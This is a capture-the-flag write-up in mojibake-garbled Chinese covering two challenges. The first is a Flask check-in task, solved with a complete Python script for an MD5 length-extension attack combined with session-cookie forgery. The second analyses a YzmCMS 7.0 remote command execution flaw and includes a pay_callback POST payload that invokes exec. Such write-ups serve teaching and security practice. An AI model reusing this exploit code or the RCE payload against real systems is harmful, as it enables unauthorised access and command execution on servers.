<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/flag&quot;)</span><br><span class="line">def flag():</span><br><span class="line">    for user in users:</span><br><span class="line">        if sign_users[user] != 1:</span><br><span class="line">            return &quot;flag&#123;æ‚é±¼~&#125;&quot;</span><br><span class="line">    return open(&#x27;/flag&#x27;, &#x27;r&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>è®¿é—®usersè·¯ç”±å¯ä»¥çŸ¥é“ç”¨æˆ·çš„ç­¾åˆ°çŠ¶æ€</p>
<p>&#x2F;login è·¯ç”±å¯ä»¥ç™»å½•</p>
<p>&#x2F; è·¯ç”±æ˜¯ç”¨æ¥ç­¾åˆ°çš„</p>
<p>&#x2F;flag èƒ½å¾—åˆ°flag</p>
<p>æˆ‘ä»¬æ¥è§‚å¯Ÿç­¾åˆ°é€»è¾‘å’ŒéªŒè¯å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def check_sign(sign, username, msg, salt):</span><br><span class="line">    if sign == md5(salt + msg + username):</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    if session.get(&#x27;sign&#x27;) == None or session.get(&#x27;username&#x27;) == None or session.get(&#x27;msg&#x27;) == None:</span><br><span class="line">        return redirect(&quot;/login&quot;)</span><br><span class="line">    sign = session.get(&#x27;sign&#x27;)</span><br><span class="line">    username = session.get(&#x27;username&#x27;)</span><br><span class="line">    msg = session.get(&#x27;msg&#x27;)</span><br><span class="line">    if check_sign(sign, username, msg, salt):</span><br><span class="line">        sign_users[username.decode()] = 1</span><br><span class="line">        return &quot;ç­¾åˆ°æˆåŠŸ&quot;</span><br><span class="line">    return redirect(&quot;/login&quot;)</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåªè¦sessioné‡Œçš„signå’Œæœ€ç»ˆ<code>md5(salt + msg + username)</code> ç›¸ç­‰å³å¯ç­¾åˆ°æˆåŠŸ</p>
<p>è¿™é‡Œçš„saltæ˜¯æœªçŸ¥çš„ï¼Œä½†æœ€åˆçš„è´¦å· student çš„æ‰€æœ‰ä¿¡æ¯æ˜¯å·²çŸ¥çš„ï¼Œå¯ä»¥ç”¨è¿™ä¸ªè´¦å·çš„ç›¸å…³ä¿¡æ¯æ¥åšhashé•¿åº¦æ‹“å±•æ”»å‡»</p>
<p>hashé•¿åº¦æ‹“å±•æ”»å‡»çš„ä»£ç å¯ä»¥å»ç½‘ä¸Šæ‰¾ç°æˆçš„</p>
<p>æ¥ç€æ˜¯sessionä¼ªé€ ï¼Œ<code>SECRET_KEY</code> å·²ç»ç»™å‡ºæ˜¯ <code>Th1s_is_5ecr3t_k3y</code>ï¼Œå†™è„šæœ¬çš„æ—¶å€™å¯ä»¥å‚è€ƒ <code>flask_session_cookie_manager3.py</code>é‡Œçš„ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import math</span><br><span class="line">from typing import Any, Dict, List</span><br><span class="line"></span><br><span class="line">rotate_amounts = [7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,</span><br><span class="line">                  5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,</span><br><span class="line">                  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,</span><br><span class="line">                  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]</span><br><span class="line"></span><br><span class="line">constants = [int(abs(math.sin(i + 1)) * 2 ** 32) &amp; 0xFFFFFFFF for i in range(64)]</span><br><span class="line"></span><br><span class="line">functions = 16 * [lambda b, c, d: (b &amp; c) | (~b &amp; d)] + \</span><br><span class="line">            16 * [lambda b, c, d: (d &amp; b) | (~d &amp; c)] + \</span><br><span class="line">            16 * [lambda b, c, d: b ^ c ^ d] + \</span><br><span class="line">            16 * [lambda b, c, d: c ^ (b | ~d)]</span><br><span class="line"></span><br><span class="line">index_functions = 16 * [lambda i: i] + \</span><br><span class="line">                  16 * [lambda i: (5 * i + 1) % 16] + \</span><br><span class="line">                  16 * [lambda i: (3 * i + 5) % 16] + \</span><br><span class="line">                  16 * [lambda i: (7 * i) % 16]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_init_values(A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -&gt; List[int]:</span><br><span class="line">    return [A, B, C, D]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def left_rotate(x, amount):</span><br><span class="line">    x &amp;= 0xFFFFFFFF</span><br><span class="line">    return ((x &lt;&lt; amount) | (x &gt;&gt; (32 - amount))) &amp; 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def padding_message(msg: bytes) -&gt; bytes:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    åœ¨MD5ç®—æ³•ä¸­ï¼Œé¦–å…ˆéœ€è¦å¯¹è¾“å…¥ä¿¡æ¯è¿›è¡Œå¡«å……ï¼Œä½¿å…¶ä½é•¿å¯¹512æ±‚ä½™çš„ç»“æœç­‰äº448ï¼Œå¹¶ä¸”å¡«å……å¿…é¡»è¿›è¡Œï¼Œå³ä½¿å…¶ä½é•¿å¯¹512æ±‚ä½™çš„ç»“æœç­‰äº448ã€‚</span><br><span class="line">    å› æ­¤ï¼Œä¿¡æ¯çš„ä½é•¿ï¼ˆBits Lengthï¼‰å°†è¢«æ‰©å±•è‡³N*512+448ï¼ŒNä¸ºä¸€ä¸ªéè´Ÿæ•´æ•°ï¼ŒNå¯ä»¥æ˜¯é›¶ã€‚</span><br><span class="line">    å¡«å……çš„æ–¹æ³•å¦‚ä¸‹ï¼š</span><br><span class="line">        1) åœ¨ä¿¡æ¯çš„åé¢å¡«å……ä¸€ä¸ª1å’Œæ— æ•°ä¸ª0ï¼Œç›´åˆ°æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶æ—¶æ‰åœæ­¢ç”¨0å¯¹ä¿¡æ¯çš„å¡«å……ã€‚</span><br><span class="line">        2) åœ¨è¿™ä¸ªç»“æœåé¢é™„åŠ ä¸€ä¸ªä»¥64ä½äºŒè¿›åˆ¶è¡¨ç¤ºçš„å¡«å……å‰ä¿¡æ¯é•¿åº¦ï¼ˆå•ä½ä¸ºBitï¼‰ï¼Œå¦‚æœäºŒè¿›åˆ¶è¡¨ç¤ºçš„å¡«å……å‰ä¿¡æ¯é•¿åº¦è¶…è¿‡64ä½ï¼Œåˆ™å–ä½64ä½ã€‚</span><br><span class="line">    ç»è¿‡è¿™ä¸¤æ­¥çš„å¤„ç†ï¼Œä¿¡æ¯çš„ä½é•¿=N*512+448+64=(N+1ï¼‰*512ï¼Œå³é•¿åº¦æ°å¥½æ˜¯512çš„æ•´æ•°å€ã€‚è¿™æ ·åšçš„åŸå› æ˜¯ä¸ºæ»¡è¶³åé¢å¤„ç†ä¸­å¯¹ä¿¡æ¯é•¿åº¦çš„è¦æ±‚ã€‚</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    orig_len_in_bits = (8 * len(msg)) &amp; 0xffffffffffffffff</span><br><span class="line">    msg += bytes([0x80])</span><br><span class="line">    while len(msg) % 64 != 56:</span><br><span class="line">        msg += bytes([0x00])</span><br><span class="line">    msg += orig_len_in_bits.to_bytes(8, byteorder=&#x27;little&#x27;)</span><br><span class="line">    return msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -&gt; int:</span><br><span class="line">    message = padding_message(message)</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    for chunk_ofst in range(0, len(message), 64):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + 64]</span><br><span class="line">        for i in range(64):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder=&#x27;little&#x27;)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; 0xFFFFFFFF</span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        for i, val in enumerate([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">    return sum(x &lt;&lt; (32 * i) for i, x in enumerate(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5_to_hex(digest: int) -&gt; str:</span><br><span class="line">    raw = digest.to_bytes(16, byteorder=&#x27;little&#x27;)</span><br><span class="line">    return &#x27;&#123;:032x&#125;&#x27;.format(int.from_bytes(raw, byteorder=&#x27;big&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -&gt; str:</span><br><span class="line">    return md5_to_hex(md5(message, A, B, C, D))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5_attack(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe,</span><br><span class="line">               D: int = 0x10325476) -&gt; int:</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    for chunk_ofst in range(0, len(message), 64):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + 64]</span><br><span class="line">        for i in range(64):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder=&#x27;little&#x27;)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; 0xFFFFFFFF</span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        for i, val in enumerate([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">    return sum(x &lt;&lt; (32 * i) for i, x in enumerate(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_init_values_from_hash_str(real_hash: str) -&gt; List[int]:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        real_hash: çœŸå®çš„hashç»“ç®—ç»“æœ</span><br><span class="line"></span><br><span class="line">    Returns: å“ˆå¸Œåˆå§‹åŒ–å€¼[A, B, C, D]</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    str_list: List[str] = [real_hash[i * 8:(i + 1) * 8] for i in range(4)]</span><br><span class="line">    # å…ˆæŒ‰ç…§å°ç«¯å­—èŠ‚åºå°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°ï¼Œç„¶åæŒ‰ç…§å¤§ç«¯å­—èŠ‚åºé‡æ–°è¯»å–è¿™ä¸ªæ•°å­—</span><br><span class="line">    return [int.from_bytes(int(&#x27;0x&#x27; + s, 16).to_bytes(4, byteorder=&#x27;little&#x27;), byteorder=&#x27;big&#x27;) for s in str_list]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_md5_attack_materials(origin_msg: bytes, key_len: int, real_hash: str, append_data: bytes) -&gt; Dict[str, Any]:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        origin_msg: åŸå§‹çš„æ¶ˆæ¯å­—èŠ‚æµ</span><br><span class="line">        key_len: åŸå§‹å¯†é’¥ï¼ˆç›ï¼‰çš„é•¿åº¦</span><br><span class="line">        real_hash: è®¡ç®—å‡ºçš„çœŸå®çš„hashå€¼</span><br><span class="line">        append_data: éœ€è¦æ·»åŠ çš„æ”»å‡»æ•°æ®</span><br><span class="line"></span><br><span class="line">    Returns: å‘èµ·æ”»å‡»éœ€è¦çš„ç‰©æ–™ä¿¡æ¯</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;attack_fake_msg&#x27;: bytes([...]),</span><br><span class="line">            &#x27;attack_hash_value&#x27;: str(a1b2c3d4...)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    init_values = get_init_values_from_hash_str(real_hash)</span><br><span class="line">    # print([&#x27;&#123;:08x&#125;&#x27;.format(x) for x in init_values])</span><br><span class="line">    # åªçŸ¥é“keyçš„é•¿åº¦ï¼Œä¸çŸ¥é“keyçš„å…·ä½“å†…å®¹æ—¶ï¼Œä»»æ„å¡«å……keyçš„å†…å®¹</span><br><span class="line">    fake_key: bytes = bytes([0xff for _ in range(key_len)])</span><br><span class="line">    # è®¡ç®—å‡ºåŠ äº†append_dataåçš„çœŸå®å¡«å……æ•°æ®</span><br><span class="line">    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)</span><br><span class="line">    # æ”»å‡»è€…æå‰è®¡ç®—æ·»åŠ äº†æ”»å‡»æ•°æ®çš„å“ˆå¸Œ</span><br><span class="line">    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[len(padding_message(fake_key + origin_msg)):],</span><br><span class="line">                                              A=init_values[0],</span><br><span class="line">                                              B=init_values[1],</span><br><span class="line">                                              C=init_values[2],</span><br><span class="line">                                              D=init_values[3]))</span><br><span class="line">    fake_padding_data = padding_message(fake_key + origin_msg)[len(fake_key + origin_msg):]</span><br><span class="line">    attack_fake_msg = origin_msg + fake_padding_data + append_data</span><br><span class="line">    return &#123;&#x27;attack_fake_msg&#x27;: attack_fake_msg, &#x27;attack_hash_value&#x27;: attack_hash_value&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">import requests, json, time</span><br><span class="line"></span><br><span class="line">class MockApp(object):</span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def session_decode(session_cookie_value, secret_key):</span><br><span class="line">    &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">    app = MockApp(secret_key)</span><br><span class="line">    si = SecureCookieSessionInterface()</span><br><span class="line">    s = si.get_signing_serializer(app)</span><br><span class="line">    return s.loads(session_cookie_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def session_encode(session_cookie_structure, secret_key):</span><br><span class="line">    &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        app = MockApp(secret_key)</span><br><span class="line">        # session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">        si = SecureCookieSessionInterface()</span><br><span class="line">        s = si.get_signing_serializer(app)</span><br><span class="line">        return s.dumps(session_cookie_structure)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req_index(url, cookie):</span><br><span class="line">    # headers = &#123;&quot;Cookie&quot;: &quot;session=&quot; + cookie&#125;</span><br><span class="line">    cookies = &#123;&quot;session&quot;:cookie&#125;</span><br><span class="line">    r = requests.get(url, cookies=cookies).text</span><br><span class="line">    # print(r)</span><br><span class="line">    if &#x27;ç­¾åˆ°æˆåŠŸ&#x27; not in r:</span><br><span class="line">        # print(cookie)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        req_index(url, cookie)</span><br><span class="line">        # print(r)</span><br><span class="line"></span><br><span class="line">def req_user(url):</span><br><span class="line">    return json.loads(requests.get(url).text)</span><br><span class="line"></span><br><span class="line">def req_login(url):</span><br><span class="line">    data = &#123;&quot;username&quot;:&quot;student&quot;, &quot;password&quot;:&quot;student&quot;&#125;</span><br><span class="line">    cookie = requests.post(url, data).headers[&quot;Set-Cookie&quot;][8:].split(&#x27;;&#x27;)[0]</span><br><span class="line">    # print(cookie)</span><br><span class="line">    return cookie</span><br><span class="line"></span><br><span class="line">def hash_Attack(md5_value, key_len, data, attack_data):</span><br><span class="line">    attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)</span><br><span class="line">    # print(data)</span><br><span class="line">    res = &#123;&quot;username&quot;:attack_data, &quot;msg&quot;:attack_materials[&#x27;attack_fake_msg&#x27;][:-len(attack_data)], &quot;sign&quot;:attack_materials[&#x27;attack_hash_value&#x27;].encode()&#125;</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &quot;http://210.44.150.15:49982/&quot;</span><br><span class="line">    cookie = req_login(url+&#x27;login&#x27;)</span><br><span class="line">    users = req_user(url+&#x27;users&#x27;)</span><br><span class="line">    secret_key = &quot;Th1s_is_5ecr3t_k3y&quot;</span><br><span class="line">    res = session_decode(cookie, secret_key)</span><br><span class="line">    for user in users:</span><br><span class="line">        if users[user] == 0:</span><br><span class="line">            res = hash_Attack(res[&quot;sign&quot;], 16, res[&quot;msg&quot;]+res[&quot;username&quot;], user.encode())</span><br><span class="line">            res2 = session_encode(res, secret_key)</span><br><span class="line">            # time.sleep(1)</span><br><span class="line">            r = req_index(url, res2)</span><br></pre></td></tr></table></figure>

<p>è·‘å®Œè¿™ä¸ªè„šæœ¬åï¼Œè®¿é—®&#x2F;flagå¾—åˆ°flag</p>
<h4 id="Week3-å°å°cms"><a href="#Week3-å°å°cms" class="headerlink" title="[Week3] å°å°cms"></a>[Week3] å°å°cms</h4><p>æˆ‘ä»¬çœ‹åˆ°è¿™æ˜¯ä¸ªYzmCMSå†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œè€Œä¸”æœ€è¿‘æ›´æ–°æåˆ°äº†å®ƒçš„ç‰ˆæœ¬</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252033701.png" alt="image-20241025203326461" loading="lazy"></p>
<p>æˆ‘ä»¬ä¸Šç½‘æŸ¥æŸ¥YzmCMS v7.0çš„æ¼æ´<a target="_blank" rel="noopener" href="https://blog.csdn.net/shelter1234567/article/details/138524342">https://blog.csdn.net/shelter1234567/article/details/138524342</a></p>
<p>æ–‡ç« æåˆ°  YzmCMS æŸäº›æ¥å£è°ƒç”¨äº† db_pdoç±»çš„whereæ–¹æ³• å¯¼è‡´äº†è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„ç³»ç»ŸæŒ‡ä»¤ï¼Œå†™å…¥åé—¨æ–‡ä»¶ï¼Œæœ€ç»ˆå¯è·å–æœåŠ¡å™¨æƒé™ã€‚</p>
<p>å½±å“ç‰ˆæœ¬&lt;&#x3D;7.0</p>
<p>è¿›è¡Œæ¼æ´åˆ†æ</p>
<p>åœ¨db_pdo.class.phpæ–‡ä»¶ä¸­ï¼Œdb_pdoå­˜åœ¨whereæ–¹æ³•ã€‚åœ¨195è¡Œå‡ºç°äº†$fun($rule)çš„æ‰§è¡Œæ–¹æ³•</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252051517.png" alt="image-20241025205145464" loading="lazy"></p>
<p>å¦‚æœ$funå’Œ$ruleéƒ½ä¸ºå¯æ§å‚æ•°å°±ä¼šå½¢æˆâ€œexec(calc)â€çš„å±é™©å‡½æ•°è°ƒç”¨æ¼æ´</p>
<p>åˆ†æ$funä¸$ruleeæ˜¯å¦‚ä½•ä¼ å‚çš„</p>
<p>é¦–å…ˆåœ¨187è¡Œä¸188è¡Œ$ruleä¸º$vv[1]å¾—åˆ°ï¼Œ $funä¸º$vv[2] å¾—åˆ°</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252054205.png" alt="image-20241025205457147" loading="lazy"></p>
<p>å‘ä¸Šåˆ†æ$vv(æœ¬èº«æ•°ç»„)æ˜¯æ•°ç»„$argsä¸­éå†çš„ï¼Œç»è¿‡æµ‹è¯•$argså…¶å®æ˜¯whereå‡½æ•°çš„å‚æ•°$arrèµ‹äºˆçš„</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦åˆ†æè°å¯ä»¥è°ƒç”¨db_pdoç±»çš„whereæ–¹æ³•</p>
<p>è°ƒç”¨whereçš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œä½†è°ƒç”¨çš„åŒæ—¶è¦è€ƒè™‘å‚æ•°æ˜¯å¦å¯æ§ï¼Œæ˜¯å¦ä¼ é€’æ•°ç»„</p>
<p>è¿™é‡Œæ ¹æ®pocæä¾›ä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„åœ°æ–¹</p>
<p>ä½äºpay&#x2F;controller&#x2F;index.class.phpä¸­çš„pay_callbackæ–¹æ³•</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252113737.png" alt="image-20241025211301663" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$out_trade_no = $_POST[&#x27;out_trade_no&#x27;];</span><br><span class="line">$order = D(&#x27;order&#x27;)-&gt;field(&#x27;id,order_sn,status,userid,username,paytype,money,quantity,`type`,`desc`&#x27;)-&gt;where(array(&#x27;order_sn&#x27; =&gt; $out_trade_no))-&gt;find();</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡å‰é¢çš„åˆ†æï¼Œä¼ é€’çš„å‚æ•°çš„æ˜¯æ•°ç»„ï¼Œè¿™é‡Œå·²ç»ç¬¦åˆè¦æ±‚äº†ã€‚æˆ‘ä»¬åªéœ€å°† $out_trade_noå˜ä¸ºæ•°ç»„å³å¯ï¼Œä¸”out_trade_no[2]ä¸ºè°ƒç”¨å‡½æ•°out_trade_no[1]ä¸ºè°ƒç”¨å‡½æ•°å‚æ•°</p>
<p>æ ¹æ®æ¡†æ¶çš„çš„æ§åˆ¶å™¨ä¸€èˆ¬è°ƒç”¨æ–¹æ³•ï¼Œæ¬²æƒ³è°ƒç”¨pay_callbackæ–¹æ³• éœ€æ„é€ è¿™æ ·çš„url â€œpay&#x2F;index&#x2F;pay_callbackâ€</p>
<p>å¯ä»¥å…ˆè¿™æ ·è®¿é—®çœ‹çœ‹è¡Œä¸è¡Œï¼Œå¦‚æœä¸è¡Œåœ¨åˆ†æä»£ç æ˜¯å¦ç¦ç”¨çš„è¿™ç§æ–¹å¼ï¼Œæ˜¯å¦æœ‰è‡ªå·±å®šä¹‰è·¯ç”±ï¼Œæ˜¯å¦æœ‰è‡ªå·±å®šä¹‰å‰ç¼€ï¼Œåç¼€ã€‚</p>
<h5 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a><strong>æ¼æ´å¤ç°</strong></h5><p>æ ¹æ®å‰é¢çš„åˆ†æçš„æˆ‘ä»¬è¿™æ ·å‘è¯·æ±‚è¡Œä¸è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /yzmcms-7.0/pay/index/pay_callback HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cookie: ;XDEBUG_SESSION=19079</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 58</span><br><span class="line"></span><br><span class="line">out_trade_no[0]=&amp;out_trade_no[1]=calc&amp;out_trade_no[2]=exec</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252126834.png" alt="image-20241025212612772" loading="lazy"></p>
<p>ç”±äºout_trade_noæ²¡æœ‰0çš„å€¼ï¼Œå‡ºç°äº†é”™è¯¯</p>
